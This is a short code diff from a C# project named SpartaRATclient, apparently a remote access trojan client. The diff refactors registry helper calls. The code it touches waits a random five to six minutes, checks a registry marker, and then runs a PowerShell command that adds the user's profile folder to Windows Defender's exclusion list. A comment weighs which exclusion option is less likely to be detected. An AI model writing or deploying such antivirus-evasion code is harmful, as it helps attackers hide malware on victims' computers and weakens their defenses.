@@ -15,8 +15,7 @@ namespace SpartaRATclient
             Random _ = new Random();
             Thread.Sleep(_.Next(300_000, 350_000));
 
-            RegistryCheck item = new RegistryCheck();
-            if (!(item.CheckIfExist("DefenderBypassed")))
+            if (!(RegistryCheck.CheckIfExist("DefenderBypassed")))
             {
                 Shell PowershellCommand = new Shell();
                 //Defender execlude bypass. "-AttackSurfaceReductionOnlyExclusions" is not risky as "-ExclusionPath" so it first to be runned
@@ -26,7 +25,7 @@ namespace SpartaRATclient
                 //HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\
                 PowershellCommand.Run("Add-MpPreference -ExclusionPath C:\\Users\\" + Environment.UserName);
                 RegistryCreate value = new RegistryCreate();
-                value.Create("DefenderBypassed", "0");
+                RegistryCreate.Create("DefenderBypassed", "0");
             }
         }
     }
